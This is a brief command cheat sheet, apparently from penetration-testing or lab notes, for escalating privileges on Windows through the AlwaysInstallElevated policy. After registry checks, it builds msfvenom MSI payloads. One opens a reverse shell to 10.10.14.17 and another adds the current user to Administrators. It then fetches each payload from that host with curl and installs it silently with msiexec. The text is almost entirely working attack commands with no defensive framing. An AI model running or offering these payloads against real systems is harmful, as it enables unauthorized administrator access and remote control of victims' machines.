## Check permission

```powershell
## should return 0x1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

get-applockerpolicy -effective | select -expandproperty rulecollections
```

## Revshell

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=9191 -f msi -o revshell.msi
```

```powershell
curl http://10.10.14.17:8080/revshell.msi -o revshell.msi
msiexec /quiet /qn /norestart /i .\revshell.msi
```

## Elevate current user to admin

```sh
msfvenom -p windows/x64/exec cmd='net localgroup Administrators <current_user> /add' -f msi -o adduser.msi
```

```powershell
curl http://10.10.14.17/adduser.msi -o adduser.msi
msiexec /quiet /qn /norestart /i .\adduser.msi
```